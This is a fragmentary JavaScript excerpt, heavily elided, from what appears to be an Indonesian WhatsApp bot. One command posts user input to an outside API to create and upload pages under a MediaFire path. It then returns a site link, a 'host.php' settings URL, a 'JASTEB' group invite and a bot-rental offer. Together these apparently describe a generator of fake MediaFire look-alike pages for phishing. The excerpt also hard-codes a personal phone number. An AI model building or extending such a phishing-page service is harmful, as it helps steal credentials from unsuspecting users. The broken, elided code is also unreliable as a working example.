...
var ownerNumber = [`${nomerOwner}@s.whatsapp.net`,`6281316643491@s.whatsapp.net`,`${ehz.user.jid}`]
...
id = msg.key.remoteJid
        ...
        reply("*BARU BUAT HARAP JANGAN SPAM ☭*")
        ...
        request.post({
            url: 'https://api.rapzhost.biz.id/rapz/mediafire/createcp.php',
            form: inputt
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://api.rapzhost.biz.id/rapz/mediafire/upload.php',
                    form: inputt
                    ...
                    if (afakahinijson(body)) {
                        ...
                        reply(`Berhasil Dikirim Ke ${namamu}`)
                    }


                    hasillrndy = `- WAJIB DI TES SEBELUM MENGGUNAKAN  ⬇️\n==========================\nwebpsite : ${pendek}\nwebp Setting : ${domain}/vhsfhqpdhdsih6/host.php\n==========================\nGC JASTEB : https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH\n`
            ...
            reply("SEWA BOT 5K PERMANEN https://chat.whatsapp.com/DC2Lhym6LpY1I42OK2gZUj")
        }
break
...
case 'mediafire': case 'mf':
            // update case
               ...
               conn.sendMessage(from, {
                    ...
                    quoted: msg
                }).catch(() => replay(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Atau Ukuran File Terlalu Besar`))
            break
